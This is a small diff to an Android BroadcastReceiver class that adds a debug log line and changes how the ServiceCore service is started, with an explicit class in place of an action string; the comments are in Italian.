@@ -3,6 +3,7 @@ package com.android.service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.util.Log;
 
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
@@ -25,9 +26,15 @@ public class BroadcastMonitor extends BroadcastReceiver {
 		// Toast.LENGTH_LONG).show();
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onReceive): starting intent"); //$NON-NLS-1$
+		} else{
+			//TODO: togliere
+			Log.d("QZ", TAG);
 		}
-		final Intent serviceIntent = new Intent();
-		serviceIntent.setAction("com.android.service.app");//Messages.getString("27.0")); //$NON-NLS-1$
+		
+		// le due righe seguenti potrebbero diventare: 
+		final Intent serviceIntent = new Intent(context, ServiceCore.class);
+		//final Intent serviceIntent = new Intent();
+		//serviceIntent.setAction("com.android.service.app");//Messages.getString("27.0")); //$NON-NLS-1$
 		context.startService(serviceIntent);
 	}
 }
